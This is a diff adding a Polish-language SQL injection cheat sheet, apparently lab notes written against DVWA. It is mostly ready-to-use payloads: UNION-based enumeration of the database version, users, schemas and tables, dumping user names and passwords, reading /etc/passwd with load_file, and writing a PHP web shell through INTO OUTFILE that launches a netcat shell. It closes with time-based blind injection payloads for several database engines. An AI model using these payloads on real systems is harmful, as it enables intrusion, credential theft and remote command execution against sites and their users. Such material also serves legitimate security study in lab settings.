@@ -1,0 +1,221 @@
+Wyróżniamy dwa rodzaje ataków SQLI
+- SQL Injection error based
+- Blind SQL Injection 
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+1.	Najpierw sprawdzamy input dodajac znak apostrofu “ ‘ “.
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+2.	Następnie sprawdzamy ilość kolumn używając funkcji „ORDER BY”, 
+
+http://server/news.php?id=5 order by 1 #
+http://server/news.php?id=5 order by 2 #
+http://server/news.php?id=5 order by 3 #
+http://server/news.php?id=5 order by 4 #
+
+Jeśli odtrzymamy błąd taki jak np.: error (we get message like this Unknown column '4' in 'order clause' or something like that) wiemy ze 4 kolumna nie istnieje.
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+3.	Sprawdzamy czy polecenie “UNION” działa.
+
+http://server/news.php?id=5 union all select 1,2,3 #
+
+Polecenie UNION służy do sklejania dwóch tabeli, jedna pod drugą. Używając same polecenie UNION usuwamy powtarzające się rekordy w drugiej tabeli, dlatego bezpieczniej użyć polecenia UNION ALL.
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+4.	Sprawdzamy wersje bazy SQL.
+
+Do tego celu możemy użyć dwóch opcji:
+- version(),
+- @@version
+http://server/news.php?id=5 union all select 1,@@version,3 #
+
+Oczywiście funkcje do sprawdzania wersji wrzucamy w miejsce zmiennej która wyświetla się nam na ekranie.
+ 
+1' union all select 1,@@version #
+W przypadku błędu:
+"union + illegal mix of collations (IMPLICIT + COERCIBLE) ..."
+
+Należy przekonwertować dane:
+-	http://server/news.php?id=5 union all select 1,convert(@@version using latin1) #
+-	http://server/news.php?id=5 union all select 1,unhex(hex(@@version)) #
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+5.	Sprawdzamy nazwę hosta.
+
+Do tego celu możemy użyć dwóch opcji:
+- @@hostname.
+http://server/news.php?id=5  union select null,@@hostname #
+ 
+' union select null,@@hostname #
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+6.	Sprawdzanie aktywnego użytkownika bazy danych.
+
+Do tego celu możemy użyć dwóch opcji:
+- user();
+- current_user;
+
+http://server/news.php?id=5   union all select system_user(),user() #
+
+ 
+' union all select system_user(),user() #
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+7.	Sprawdzanie nazwy bazy danych.
+
+Do tego celu używamy składni: ‘ union select null,database() #
+
+http://server/news.php?id=5 union select null,database() #
+ 
+' union select 1,database() #
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+8.	Sprawdzanie wszystkich baz danych na serwerze MySQL
+Opcja ta zadziała tylko powyżej wersji 5.0 gdzie mamy do dyspozycji MySQL Schema.
+‘ union select null,schema_name from information_schema.schemata #
+ 
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+9.	Sprawdzanie nazwy tabel w information_schema.
+‘ union select null,table_name from information_schema.tables #
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+10.	 Sprawdzanie nazwy tabel ze wskazanej bazy danych.
+‘ union select null,table_name from information_schema.tables where table_schema = dvwa’ #
+ 
+ 
+////////////////////////////////////////////////////////////////////////////////////
+ 
+ 
+11.	 Sprawdzanie nazw kolumn ze wskazanej tabeli.
+‘ union all select null, column_name FROM information_schema.columns where table_name = ‘users’ #
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+12.	 Wyświetlenie rekordów ze wskazanej kolumny.
+‘ union select null,first_name from users #
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+13.	 Wyświetlenie rekordów z kilku kolumn przy użyciu funkcji concat().
+‘ union select null, concat(first_name,0x0a,password) from users #
+ 
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+14.	 Sprawdzanie lokalizacji bazy danych.
+ ‘ union select null,@@datadir #
+
+ 
+////////////////////////////////////////////////////////////////////////////////////
+
+
+15.	 Wyświetlenie plików z hosta gdzie stoi baza danych.
+‘ union all select load_file(‘/etc/passwd’),null #
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+16.	 Tworzenie pliku przy użyciu MySQL.
+' UNION select null, name from dvwa.users INTO OUTFILE '/var/www/dvwa/dvwa_passwords.txt' #
+
+' UNION select null,concat(first_name,0x3a,last_name,0x3a,user,0x3a,password) from dvwa.users INTO OUTFILE '/var/www/html/dvwa/dvwa_passwords.txt' #
+
+' UNION SELECT 'Awesome', 'text' INTO OUTFILE 'awesometext.txt’ #
+
+Należy znaleźć plik PHPINFO.PHP I sprawdzić lokalizacje plików
+ 
+W przypadku błędu:
+ 
+Oznacza to, Linux ma wbudowany koncept zabezpieczeń AppArmor i MySQL może być chroniony przez ten tryb.
+
+Żeby to sprawdzić podczas labów wykonujemy komendę SUDO AA-STATUS na hoście atakowanym:
+
+ 
+' UNION SELECT '', '<?php system($_GET["bash"]); ?>' INTO OUTFILE '/tmp/shell.php' #
+http://192.168.43.4/dvwa/shell.php?bash=nc%20-lvp%201334%20-e%20/bin/bash
+Teraz należy przeprowadzić atak typu LFI I wywołać plik shell.php z odpowiednim parametrem GET: http://192.168.43.4/dvwa/shell.php?bash=ls
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+17.	 SQLI Based on Time
+MySQL	SLEEP(time) – dostępne od werjsi MySQL 5
+	BENCHMARK(count, expr)
+SQL Server	Wait For Delay ‘hh:mm:ss’
+	Wait For Time ‘hh:mm:ss’
+Oracle	BEGIN DBMS_LOCK.SLEEP(15); END;
+
+MySQL	IF(condition, when_true, when_false)
+SQL Server	IF condition when_true [ELSE when_false]
+Oracle	IF condition THEN when_true [ELSE when_false] END IF
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+18.	 MySQL
+
+SELECT * FROM products WHERE id=1-SLEEP(15) #
+SELECT * FROM products WHERE id=1-BENCHMARK(100000000, rand()) #
+
+SELECT * FROM products WHERE id=1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0)
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+19.	 SQL
+SELECT * FROM products WHERE id=1; WAIT FOR DELAY '00:00:15' #
+SELECT * FROM products WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15' #
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+20.	 Oracle
+BEGIN DBMS_LOCK.SLEEP(15); END;
+
+
+////////////////////////////////////////////////////////////////////////////////////
+
+
+21.	 Wyciąganie pokolei znaków.
+' -IF(substring((SELECT user from users limit 0,1),1,1)="a",SLEEP(5),0) #
+Dla 5 wierszy w tabeli w tym przypadku trzeba czekać 25 sekund.
+
+
+////////////////////////////////////////////////////////////////////////////////////
